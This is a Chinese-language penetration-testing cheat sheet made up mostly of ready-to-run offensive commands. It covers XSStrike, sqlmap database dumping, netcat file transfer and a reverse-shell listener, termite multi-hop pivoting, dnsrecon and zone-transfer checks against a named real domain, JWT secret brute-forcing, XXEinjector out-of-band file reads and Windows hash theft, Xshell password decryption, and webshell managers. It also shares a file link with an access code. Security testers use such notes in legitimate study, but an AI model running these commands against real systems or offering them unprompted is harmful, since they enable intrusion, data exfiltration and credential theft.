### 常用的相关安全工具

#### XSS

##### [XSStrike](https://github.com/s0md3v/XSStrike)

`python3 xsstrike.py -u "http://example.com/search.php?q=query"`

[![5xc1p9.png](https://z3.ax1x.com/2021/10/30/5xc1p9.png)](https://imgtu.com/i/5xc1p9)

[![5xcNTO.png](https://z3.ax1x.com/2021/10/30/5xcNTO.png)](https://imgtu.com/i/5xcNTO)

`python3 xsstrike.py -u "http://example.com/search.php" --data "q=query"`

`python3 xsstrike.py -u "http://example.com/search.php" --data '{"q":"query"} --json'`

`python3 xsstrike.py -u "http://example.com/search/form/query" --path`

`python3 xsstrike.py -u "http://example.com/page.php" --crawl`

您可以指定爬网的深度,默认2：-l

`python3 xsstrike.py -u "http://example.com/page.php" --crawl -l 3`

5.如果要测试文件中的URL，或者只是想添加种子进行爬网，则可以使用该—seeds选项：

`python xsstrike.py --seeds urls.txt`

6.查找隐藏的参数：

通过解析HTML和暴力破解来查找隐藏的参数

`python3 xsstrike.py -u "http://example.com/page.php" --params`

7.盲XSS：爬行中使用此参数可向每个html表单里面的每个变量插入xss代码

`python3 xsstrike.py -u http://example.com/page.php?q=query --crawl --blind`

8.模糊测试—fuzzer

该模糊器旨在测试过滤器和Web应用程序防火墙，可使用-d选项将延迟设置为1秒。

`python3 xsstrike.py -u "http://example.com/search.php?q=query" --fuzzer`

9.跳过DOM扫描

在爬网时可跳过DOM XSS扫描，以节省时间

`python3 xsstrike.py -u "http://example.com/search.php?q=query" --skip-dom`

##### [XSS平台](https://xss8.cc/)

...

#### SQL注入



##### sqlmap

![bGeky6.jpg](https://s4.ax1x.com/2022/03/02/bGeky6.jpg)

`python sqlmap.py -u "" -p id`	这里-p id是url中怀疑哪些参数存在注入

`python sqlmap.py -u "" --current-db`查询当前数据库

`python sqlmap.py -i "" --batch` 默认继续

`python sqlmap.py -u "" --current-user`查询当前用户

`python sqlmap.py -u "" -p id --dbs`在原有的确定参数后，查询数据库

`python sqlmap.py -u "" -p id -D information_schema --tables`在指定information_schema数据库后查询表

`python sqlmap.py -u "" -p id -D information_schema -T schemata --columns`在指定表schemata后查询列

`python sqlmap.py -u "" -p id -D information_schema -T schemata --columns -C CATALOG_NAME,DEFAULT_CHARACTER_SET_NAME --dump`指定库名表名字段dump出指定字段

`python sqlmap.py -r target.txt`指定在target.txt文件下进行post注入，这里文件在bp中先保存

`python sqlmap.py -u "" --level 3 --risk 3`指定扫描的风险和等级

`python sqlmap.py -u "" --cookie=" " --dbs`在查询数据库时指定cookie

`python sqlmap.py -u "" --data="username=1&password=2"`指定post中data

`python sqlmap.py -u "" --users`获取数据库用户

--user-agent="Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0"

`python sqlmap.py -u "" --user-agent=" "` 指定主机头或者`--random-agent`

`python sqlmap.py -u "" --referer=" "`指定referer

`python sqlmap.py -u "" --proxy=" "`指定代理IP，IP后加上指定端口

`python sqlmap.py -u "" --delay=1`z指定延迟1s

oracle:

	sqlmap.py -u "http://127.0.0.1/?id=1" --roles	//查看管理员的用户名
##### SQLmap和burp联动-批量爬取验证sql注入

https://hub.fastgit.xyz/ianxtianxt/SleuthQL

> Options:
>   -h, --help            查看帮助信息
>   -d DOMAINS, --domains=DOMAINS
> ​                        Comma separated list of domains to analyze. i.e.:
> ​                        google.com,mozilla.com,rhinosecuritylabs.com
>   -f PROXY_XML, --xml=PROXY_XML
> ​                        Burp proxy history xml export to parse. Must be base64
> ​                        encoded.
>   -v, --verbose         Show verbose errors that occur during parsing of the
> ​                        input XML."

这里直接在burpsuite的sitemap上保存日志未test.xml，然后执行命令

`python3 sleuthql.py -d www.0-sec.org -f test.xml`

这里会自动筛选-f下的test.xml内容将结果放在创建好的www.0-sec.org文件夹下，然后执行命令

`find . -name "*.txt" -exec sqlmap --batch -r {} --tables mysql  \;`

建议在kali下安装运行，因为在寻找sqlmap时windows下必须添加到环境变量，而且find是linux下的命令

[![bG2ch8.png](https://s4.ax1x.com/2022/03/02/bG2ch8.png)](https://imgtu.com/i/bG2ch8)





#### 信息收集

##### 7kbscan-扫路径

##### Advanced Port Scanner-扫端口

##### Layer-扫子域名

#### webshell管理工具

##### 蚁剑

##### 冰蝎

这里必须强调一下，java版本不能过高，推荐11，配置视频在b站搜

#### nmap

![](https://s4.ax1x.com/2022/03/02/bGeFQx.png)

https://www.sqlsec.com/2017/07/nmap.html#toc-heading-6

#### nc

###### 建立通讯

nc.exe -l -p 12345

nc.exe 192.168.0.200 12345

###### 扫开放端口

nc -vz -w 2 192.168.0.200 8001-8009

###### 传文件

nc.exe 192.168.0.100 12345 >1.txt	正向传

nc.exe 192.168.0.100 12345 <1.txt	反向传

###### 反弹shell

nc -lvvp xxx xx

#### termite

###### 多层跳板

admin_Win32.exe -c 192.168.0.100 -p 6666

goto 2

connect 192.168.1.200 7777

goto 3

connect 192.168.1.300 8888

upfile d:\1.txt 

shell 1188

nc 本机ip 1188

lcxtran 



#### dnsrecon

获取目标域名的 SOA, NS, A, MX , MX , SPF等信息

由该工具的搜集结果我们大致可能知道目标采用了什么邮件服务器、被哪家服务商托管的、A记录对应的服务器地址是多少……

~~~shell
$ dnsrecon -t std -d zhenrongbao.com
~~~

~~~shell
-d, --domain      <domain>   Target domain.
-t, --type        <types>    Type of enumeration to perform:
                                std       SOA, NS, A, AAAA, MX and SRV if AXRF on the NS servers fail.// 基本的查询
                                rvl       Reverse lookup of a given CIDR or IP range.
                                brt       Brute force domains and hosts using a given dictionary. // 暴力枚举
                                srv       SRV records.
                                axfr      Test all NS servers for a zone transfer. // 域传送漏洞
                                goo       Perform Google search for subdomains and hosts.
                                snoop     Perform cache snooping against all NS servers for a given domain, testing
                                          all with file containing the domains, file given with -D option.
                                tld       Remove the TLD of given domain and test against all TLDs registered in IANA.
                                zonewalk  Perform a DNSSEC zone walk using NSEC records.
例子
$ dnsrecon -t std -d zhenrongbao.com
[*] Performing General Enumeration of Domain:
[-] DNSSEC is not configured for zhenrongbao.com
[*]      SOA vip1.alidns.com 47.88.44.151
[*]      SOA vip1.alidns.com 140.205.29.113
[*]      SOA vip1.alidns.com 140.205.228.51
         ******* <省略> *******
[*]      A zhenrongbao.com 180.97.161.183
[*]      TXT zhenrongbao.com v=spf1 include:spf.mail.qq.com ~all
[*] Enumerating SRV Records
[-] No SRV Records Found for zhenrongbao.com
[*] 0 Records Found
由以上情况我们可以知道目标是被阿里云托管、使用了腾讯邮箱、同时还包括一个A记录，解析到了 180.97.164.183

验证域传送漏洞
$ dnsrecon -t axfr -d zhenrongbao.com -a
~~~

#### jwtcrack

6bb4837eb74329105ee4568dda7dc67ed2ca2ad9

##### 禁用哈希6

~~~python
python jwtcrack.py -m generate -s {"admin":"True"}
~~~

##### 批量爆破弱密钥

~~~python
python jwtcrack.py -m blasting -s eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.keH6T3x1z7mmhKL1T3r9sQdAxxdzB6siemGMr_6ZOwU --kf C:\Users\Ch1ng\Desktop\2.txt
~~~

这里C:\Users\Ch1ng\Desktop\2.txt就是你的字典



#### XXEinjector

~~~ruby
--host     必填项– 用于建立反向链接的IP地址。(--host=192.168.0.2)
--file      必填项- 包含有效HTTP请求的XML文件。(--file=/tmp/req.txt)
--path           必填项-是否需要枚举目录 – 枚举路径。(--path=/etc)
--brute          必填项-是否需要爆破文件 -爆破文件的路径。(--brute=/tmp/brute.txt)
--logger        记录输出结果。
--rhost          远程主机IP或域名地址。(--rhost=192.168.0.3)
--rport          远程主机的TCP端口信息。(--rport=8080)
--phpfilter    在发送消息之前使用PHP过滤器对目标文件进行Base64编码。
--netdoc     使用netdoc协议。(Java).
--enumports   枚举用于反向链接的未过滤端口。(--enumports=21,22,80,443,445)
--hashes       窃取运行当前应用程序用户的Windows哈希。
--expect        使用PHP expect扩展执行任意系统命令。(--expect=ls)
--upload       使用Java jar向临时目录上传文件。(--upload=/tmp/upload.txt)
--xslt      XSLT注入测试。
--ssl              使用SSL。
--proxy         使用代理。(--proxy=127.0.0.1:8080)
--httpport Set自定义HTTP端口。(--httpport=80)
--ftpport       设置自定义FTP端口。(--ftpport=21)
--gopherport  设置自定义gopher端口。(--gopherport=70)
--jarport       设置自定义文件上传端口。(--jarport=1337)
--xsltport  设置自定义用于XSLT注入测试的端口。(--xsltport=1337)
--test     该模式可用于测试请求的有效。
--urlencode     URL编码，默认为URI。
--output       爆破攻击结果输出和日志信息。(--output=/tmp/out.txt)
--timeout     设置接收文件/目录内容的Timeout。(--timeout=20)
--contimeout  设置与服务器断开连接的，防止DoS出现。(--contimeout=20)
--fast     跳过枚举询问，有可能出现结果假阳性。
--verbose     显示verbose信息。
~~~

这里常用的就是前几个

##### 示例

###### 枚举HTTPS应用程序中的/etc目录：

~~~ruby
ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt –ssl
~~~

这里--host=192.168.0.2是本地IP地址，--path=/etc是爆破etc目录，--file是包含有效HTTP请求的XML文件，我们通常在burpsuite上直接抓包保存成txt文件，-ssl不用说，--brute爆破文件，这里可以用自己的字典

###### 使用gopher（OOB方法）枚举/etc目录：

~~~
ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher
~~~

详细见https://www.freebuf.com/column/170971.html



#### jsEncrypter

我们在登录框进行登录时



#### SharpXDecrypt

读xshell7的账号的密码

[![bv8qPg.png](https://s1.ax1x.com/2022/03/15/bv8qPg.png)](https://imgtu.com/i/bv8qPg)



#### 数据库日志监听1.0

> https://pan.baidu.com/share/init?surl=deEqOtUGsbEk_BfoXvRnOQ
>
> zkaq

























































































